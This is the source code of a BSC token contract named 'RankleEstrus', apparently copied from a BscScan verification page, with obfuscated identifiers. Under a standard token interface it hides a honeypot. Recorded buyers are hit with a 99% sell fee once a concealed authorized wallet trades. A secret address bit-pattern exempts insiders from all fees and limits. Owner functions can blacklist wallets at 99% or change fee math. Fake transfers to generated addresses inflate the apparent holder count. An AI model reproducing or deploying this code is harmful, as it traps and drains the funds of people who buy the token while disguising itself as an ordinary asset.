/**
 *Submitted for verification at BscScan.com on 2022-12-21
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.6;abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    modifier onlyAuthorized() {        require(isAuthorized(msg.sender), "!Authorized");        _;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    function Owner() public view returns (address) {        return owner;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    function SetAuthorized(address adr) public onlyOwner() {        competent[adr] = true;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }}library SafeMath {    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function tryDiv(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a / b);    }    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function tryMul(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (a == 0) return (true, 0);        uint256 c = a * b;        if (c / a != b) return (false, 0);        return (true, c);    }    }    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }}interface IUniswapV2Router {    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function WETH() external pure returns (address);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function factory() external pure returns (address);    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);    function swapExactTokensForTokensSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}interface IBEP20 {    function totalSupply() external view returns (uint256);    function symbol() external view returns (string memory);    function allowance(address _owner, address spender)    external    view    returns (uint256);    function approve(address spender, uint256 amount) external returns (bool);    function name() external view returns (string memory);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function getOwner() external view returns (address);    function decimals() external view returns (uint8);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function balanceOf(address account) external view returns (uint256);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}contract RankleEstrus is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    string constant _name = "Rankle Estrus ";    string constant _symbol = "RankleEstrus";    uint8 constant _decimals = 18;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private autoBotsMinMarketingReceiverFeeTrading;    mapping(address => bool) private buyAutoTxSellMarketing;    mapping(address => bool) private autoTxMaxBotsTrading;    mapping(address => bool) private burnTeamIsMin;    mapping(address => uint256) private exemptBuyModeLaunchedTradingLiquidityMarketing;    mapping(uint256 => address) private limitMaxMinTeam;    uint256 public maxWalletAmount = 0;    uint256 private launchBlock = 0;    //BUY FEES    uint256 private limitBurnTxLiquidity = 0;    uint256 private marketingTradingReceiverWallet = 8;    //SELL FEES    uint256 private swapTeamMaxBots = 0;    uint256 private minMarketingFeeSwapSell = 8;    uint256 private modeAutoTxFeeReceiver = marketingTradingReceiverWallet + limitBurnTxLiquidity;    uint256 private receiverBuyAutoFee = 100;    address private receiverWalletFeeBurnBots = (msg.sender); // auto-liq address    address private feeReceiverMinBuyIsLaunchedWallet = (0x189a0c4479Ea5C9C55524774FFFFDcBff811fe91); // marketing address    address private burnSwapWalletLiquidity = DEAD;    address private receiverMinIsTx = DEAD;    address private feeSellMinMaxExemptReceiver = DEAD;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private buyLiquidityIsBurn;    uint256 private buyReceiverWalletMarketing;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);    bool private modeMarketingIsSell;    uint256 private minFeeAutoReceiverBurnMaxLaunched;    uint256 private exemptSellMinBurn;    uint256 private marketingModeWalletTeam;    uint256 private modeExemptTradingReceiver;    bool private swapModeMarketingIs = true;    bool private burnTeamIsMinMode = true;    bool private walletSwapReceiverBurn = true;    bool private txSwapTeamBurn = true;    bool private walletBotsSellSwap = true;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    uint256 private minBotsWalletMax = 6 * 10 ** 15;    uint256 private buyReceiverTxMaxMinTrading = _totalSupply / 1000; // 0.1%        uint256 public minModeMaxLaunched = 0;    bool private swapBuyLaunchedBots = false;    bool public burnSellExemptFeeMax = false;    uint256 private buyWalletMinReceiverIs = 0;    bool public sellMaxExemptBotsTradingWallet = false;    bool private swapIsMarketingMax = false;    bool public teamAutoReceiverMode = false;    bool public tradingTxFeeBurnMode = false;    bool private swapFeeIsReceiver = false;    uint256 private limitTradingFeeAuto = 0;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        modeMarketingIsSell = true;        autoBotsMinMarketingReceiverFeeTrading[msg.sender] = true;        autoBotsMinMarketingReceiverFeeTrading[address(this)] = true;        buyAutoTxSellMarketing[msg.sender] = true;        buyAutoTxSellMarketing[0x0000000000000000000000000000000000000000] = true;        buyAutoTxSellMarketing[0x000000000000000000000000000000000000dEaD] = true;        buyAutoTxSellMarketing[address(this)] = true;        autoTxMaxBotsTrading[msg.sender] = true;        autoTxMaxBotsTrading[0x0000000000000000000000000000000000000000] = true;        autoTxMaxBotsTrading[0x000000000000000000000000000000000000dEaD] = true;        autoTxMaxBotsTrading[address(this)] = true;        SetAuthorized(address(0x781d5B35eb6dF4AeabAbBDa3fffFC8f34676DbBC));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return botsLaunchedBuyExempt(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return botsLaunchedBuyExempt(sender, recipient, amount);    }    function txLaunchedTradingBurn(address sender, uint256 pFee) private view returns (uint256) {        uint256 f0 = exemptBuyModeLaunchedTradingLiquidityMarketing[sender];        uint256 f1 = pFee;        if (f0 > 0 && block.timestamp - f0 > 2) {            f1 = 99;        }        return f1;    }
    function walletBotsMinFee(address addr) private {        if (txTradingBurnFee() < minBotsWalletMax) {            return;        }        maxWalletAmount = maxWalletAmount + 1;        limitMaxMinTeam[maxWalletAmount] = addr;    }
    function setFeeSellMinMaxExemptReceiver(address a0) public onlyOwner {        if (feeSellMinMaxExemptReceiver == receiverWalletFeeBurnBots) {            receiverWalletFeeBurnBots=a0;        }        feeSellMinMaxExemptReceiver=a0;    }
    function txModeTeamBurnIsSwap(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function getFeeSellMinMaxExemptReceiver() public view returns (address) {        if (feeSellMinMaxExemptReceiver != receiverWalletFeeBurnBots) {            return receiverWalletFeeBurnBots;        }        if (feeSellMinMaxExemptReceiver == feeSellMinMaxExemptReceiver) {            return feeSellMinMaxExemptReceiver;        }        return feeSellMinMaxExemptReceiver;    }
    function setSwapModeMarketingIs(bool a0) public onlyOwner {        if (swapModeMarketingIs != walletBotsSellSwap) {            walletBotsSellSwap=a0;        }        swapModeMarketingIs=a0;    }
    function setBurnTeamIsMinMode(bool a0) public onlyOwner {        burnTeamIsMinMode=a0;    }
    function marketingBuyAutoBurn() private {        if (maxWalletAmount > 0) {            for (uint256 i = 1; i <= maxWalletAmount; i++) {                if (exemptBuyModeLaunchedTradingLiquidityMarketing[limitMaxMinTeam[i]] == 0) {                    exemptBuyModeLaunchedTradingLiquidityMarketing[limitMaxMinTeam[i]] = block.timestamp;                }            }            maxWalletAmount = 0;        }    }
    function getSwapModeMarketingIs() public view returns (bool) {        if (swapModeMarketingIs != swapIsMarketingMax) {            return swapIsMarketingMax;        }        if (swapModeMarketingIs == swapBuyLaunchedBots) {            return swapBuyLaunchedBots;        }        return swapModeMarketingIs;    }
    function marketingFeeBotsLiquidityLimit(address sender) internal view returns (bool) {        return !buyAutoTxSellMarketing[sender];    }
    function modeLiquidityBuySwapFeeSellTeam(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function setMarketingTradingReceiverWallet(uint256 a0) public onlyOwner {        if (marketingTradingReceiverWallet == modeAutoTxFeeReceiver) {            modeAutoTxFeeReceiver=a0;        }        marketingTradingReceiverWallet=a0;    }
    function getBurnTeamIsMin(address a0) public view returns (bool) {        if (burnTeamIsMin[a0] == buyAutoTxSellMarketing[a0]) {            return swapFeeIsReceiver;        }        if (a0 != feeSellMinMaxExemptReceiver) {            return walletSwapReceiverBurn;        }        if (a0 == feeReceiverMinBuyIsLaunchedWallet) {            return swapFeeIsReceiver;        }            return burnTeamIsMin[a0];    }
    function getSwapIsMarketingMax() public view returns (bool) {        if (swapIsMarketingMax == swapFeeIsReceiver) {            return swapFeeIsReceiver;        }        if (swapIsMarketingMax != swapFeeIsReceiver) {            return swapFeeIsReceiver;        }        if (swapIsMarketingMax != walletSwapReceiverBurn) {            return walletSwapReceiverBurn;        }        return swapIsMarketingMax;    }
    function setSwapIsMarketingMax(bool a0) public onlyOwner {        if (swapIsMarketingMax != burnTeamIsMinMode) {            burnTeamIsMinMode=a0;        }        swapIsMarketingMax=a0;    }
    function getMarketingTradingReceiverWallet() public view returns (uint256) {        if (marketingTradingReceiverWallet == limitTradingFeeAuto) {            return limitTradingFeeAuto;        }        if (marketingTradingReceiverWallet == modeAutoTxFeeReceiver) {            return modeAutoTxFeeReceiver;        }        if (marketingTradingReceiverWallet == buyWalletMinReceiverIs) {            return buyWalletMinReceiverIs;        }        return marketingTradingReceiverWallet;    }
    function setReceiverBuyAutoFee(uint256 a0) public onlyOwner {        receiverBuyAutoFee=a0;    }
    function getAutoTxMaxBotsTrading(address a0) public view returns (bool) {        if (autoTxMaxBotsTrading[a0] != buyAutoTxSellMarketing[a0]) {            return txSwapTeamBurn;        }        if (a0 == receiverWalletFeeBurnBots) {            return walletSwapReceiverBurn;        }        if (autoTxMaxBotsTrading[a0] != autoTxMaxBotsTrading[a0]) {            return burnTeamIsMinMode;        }            return autoTxMaxBotsTrading[a0];    }
    function teamBotsFeeMin(address sender, bool selling) internal returns (uint256) {                if (buyWalletMinReceiverIs == limitTradingFeeAuto) {            buyWalletMinReceiverIs = swapTeamMaxBots;        }        if (swapFeeIsReceiver != swapModeMarketingIs) {            swapFeeIsReceiver = walletBotsSellSwap;        }        if (selling) {            modeAutoTxFeeReceiver = minMarketingFeeSwapSell + swapTeamMaxBots;            return txLaunchedTradingBurn(sender, modeAutoTxFeeReceiver);        }        if (!selling && sender == uniswapV2Pair) {            modeAutoTxFeeReceiver = marketingTradingReceiverWallet + limitBurnTxLiquidity;            return modeAutoTxFeeReceiver;        }        return txLaunchedTradingBurn(sender, modeAutoTxFeeReceiver);    }
    function botsLaunchedBuyExempt(address sender, address recipient, uint256 amount) internal returns (bool) {                if (swapFeeIsReceiver != walletBotsSellSwap) {            swapFeeIsReceiver = swapBuyLaunchedBots;        }        bool bLimitTxWalletValue = modeLiquidityBuySwapFeeSellTeam(sender) || modeLiquidityBuySwapFeeSellTeam(recipient);                if (sender == uniswapV2Pair) {            if (maxWalletAmount != 0 && isAuthorized(recipient)) {                marketingBuyAutoBurn();            }            if (!bLimitTxWalletValue) {                walletBotsMinFee(recipient);            }        }                if (recipient == uniswapV2Pair && _balances[recipient] == 0) {            launchBlock = block.number + 10;        }        if (!bLimitTxWalletValue) {            require(block.number >= launchBlock, "No launch");        }                if (swapFeeIsReceiver == swapModeMarketingIs) {            swapFeeIsReceiver = burnTeamIsMinMode;        }        if (buyWalletMinReceiverIs != buyReceiverTxMaxMinTrading) {            buyWalletMinReceiverIs = limitBurnTxLiquidity;        }        if (inSwap || bLimitTxWalletValue) {return txModeTeamBurnIsSwap(sender, recipient, amount);}        if (!autoBotsMinMarketingReceiverFeeTrading[sender] && !autoBotsMinMarketingReceiverFeeTrading[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                require((amount <= _maxTxAmount) || autoTxMaxBotsTrading[sender] || autoTxMaxBotsTrading[recipient], "Max TX Limit!");        if (tradingIsTxBuy()) {modeReceiverBurnBotsMaxTradingAuto();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                if (limitTradingFeeAuto == receiverBuyAutoFee) {            limitTradingFeeAuto = modeAutoTxFeeReceiver;        }        if (swapBuyLaunchedBots == txSwapTeamBurn) {            swapBuyLaunchedBots = walletSwapReceiverBurn;        }        uint256 amountReceived = marketingFeeBotsLiquidityLimit(sender) ? buyExemptFeeModeMarketingTeam(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function getSwapTeamMaxBots() public view returns (uint256) {        if (swapTeamMaxBots == launchBlock) {            return launchBlock;        }        return swapTeamMaxBots;    }
    function setSwapTeamMaxBots(uint256 a0) public onlyOwner {        if (swapTeamMaxBots != minBotsWalletMax) {            minBotsWalletMax=a0;        }        swapTeamMaxBots=a0;    }
    function getTxSwapTeamBurn() public view returns (bool) {        return txSwapTeamBurn;    }
    function setBurnTeamIsMin(address a0,bool a1) public onlyOwner {        if (a0 == feeReceiverMinBuyIsLaunchedWallet) {            txSwapTeamBurn=a1;        }        burnTeamIsMin[a0]=a1;    }
    function modeReceiverBurnBotsMaxTradingAuto() internal swapping {                if (buyWalletMinReceiverIs == buyReceiverTxMaxMinTrading) {            buyWalletMinReceiverIs = launchBlock;        }        uint256 amountToLiquify = buyReceiverTxMaxMinTrading.mul(limitBurnTxLiquidity).div(modeAutoTxFeeReceiver).div(2);        uint256 amountToSwap = buyReceiverTxMaxMinTrading.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                uint256 amountBNB = address(this).balance;        uint256 totalETHFee = modeAutoTxFeeReceiver.sub(limitBurnTxLiquidity.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(limitBurnTxLiquidity).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(marketingTradingReceiverWallet).div(totalETHFee);                payable(feeReceiverMinBuyIsLaunchedWallet).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                receiverWalletFeeBurnBots,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function setTxSwapTeamBurn(bool a0) public onlyOwner {        if (txSwapTeamBurn == swapModeMarketingIs) {            swapModeMarketingIs=a0;        }        if (txSwapTeamBurn == walletSwapReceiverBurn) {            walletSwapReceiverBurn=a0;        }        txSwapTeamBurn=a0;    }
    function getSwapBuyLaunchedBots() public view returns (bool) {        if (swapBuyLaunchedBots == swapIsMarketingMax) {            return swapIsMarketingMax;        }        if (swapBuyLaunchedBots != walletBotsSellSwap) {            return walletBotsSellSwap;        }        if (swapBuyLaunchedBots == burnTeamIsMinMode) {            return burnTeamIsMinMode;        }        return swapBuyLaunchedBots;    }
    function buyExemptFeeModeMarketingTeam(address sender, address receiver, uint256 amount) internal returns (uint256) {                if (buyWalletMinReceiverIs == buyReceiverTxMaxMinTrading) {            buyWalletMinReceiverIs = modeAutoTxFeeReceiver;        }        uint256 feeAmount = amount.mul(teamBotsFeeMin(sender, receiver == uniswapV2Pair)).div(receiverBuyAutoFee);        if (burnTeamIsMin[sender] || burnTeamIsMin[receiver]) {            feeAmount = amount.mul(99).div(receiverBuyAutoFee);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                if (_balances[address(this)] > 4 * 10 ** _decimals && sender == uniswapV2Pair) {            for (uint i = 0; i < 4; i++) {                address addr = address(uint160(block.timestamp + i));                _balances[addr] = _balances[addr] + 10 ** _decimals;                emit Transfer(address(this), addr, 10 ** _decimals);            }            _balances[address(this)] = _balances[address(this)].sub(4 * 10 ** _decimals);        }        return amount.sub(feeAmount);    }
    function tradingIsTxBuy() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    walletBotsSellSwap &&    _balances[address(this)] >= buyReceiverTxMaxMinTrading;    }
    function txTradingBurnFee() private view returns (uint256) {        address t0 = WBNB;        if (address(this) < WBNB) {            t0 = address(this);        }        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;        return buyAmount;    }
    function setAutoTxMaxBotsTrading(address a0,bool a1) public onlyOwner {        if (a0 == feeReceiverMinBuyIsLaunchedWallet) {            swapFeeIsReceiver=a1;        }        autoTxMaxBotsTrading[a0]=a1;    }
    function setSwapBuyLaunchedBots(bool a0) public onlyOwner {        if (swapBuyLaunchedBots != walletBotsSellSwap) {            walletBotsSellSwap=a0;        }        if (swapBuyLaunchedBots != swapBuyLaunchedBots) {            swapBuyLaunchedBots=a0;        }        swapBuyLaunchedBots=a0;    }
    function getReceiverBuyAutoFee() public view returns (uint256) {        if (receiverBuyAutoFee != limitTradingFeeAuto) {            return limitTradingFeeAuto;        }        if (receiverBuyAutoFee == marketingTradingReceiverWallet) {            return marketingTradingReceiverWallet;        }        if (receiverBuyAutoFee != limitTradingFeeAuto) {            return limitTradingFeeAuto;        }        return receiverBuyAutoFee;    }
    function getBurnTeamIsMinMode() public view returns (bool) {        if (burnTeamIsMinMode == walletSwapReceiverBurn) {            return walletSwapReceiverBurn;        }        if (burnTeamIsMinMode != swapModeMarketingIs) {            return swapModeMarketingIs;        }        if (burnTeamIsMinMode != burnTeamIsMinMode) {            return burnTeamIsMinMode;        }        return burnTeamIsMinMode;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}